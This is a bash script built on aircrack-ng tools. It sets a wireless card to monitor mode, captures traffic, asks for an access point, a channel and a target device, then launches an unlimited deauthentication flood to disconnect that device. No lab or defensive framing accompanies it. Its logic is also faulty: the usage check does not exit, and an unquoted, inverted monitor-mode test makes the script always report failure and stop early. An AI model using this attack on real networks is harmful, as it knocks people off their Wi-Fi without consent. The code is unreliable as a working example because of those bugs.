#!/bin/bash

if [ "$#" -ne 1 ]; then
	echo "Usage: $0 <interface>"
fi

echo "Enabling monitor mode"

sudo airmon-ng check kill
sudo airmon-ng start "$1"

mode=$(iwconfig "$1" 2>&1 | grep 'Mode:Monitor')

if [ -n $mode ]; then
	echo "Could not set $1 into monitor mode."
	exit
fi

echo "Capturing network traffic, Ctrl+C to stop."

sudo airodump-ng "$1" 

echo "Enter BSSID"
read -r bssid
echo "Enter Channel"
read -r chnl

echo "Capturing $bssid, Ctrl+C to stop."

sudo airodump-ng "$1" --bssid "$bssid" --channel "$chnl"

echo "Enter targets MAC address"
read -r target_mac

echo "See ya :)"

sudo aireplay-ng "$1" -a "$bssid" -c "$target_mac" --deauth 0



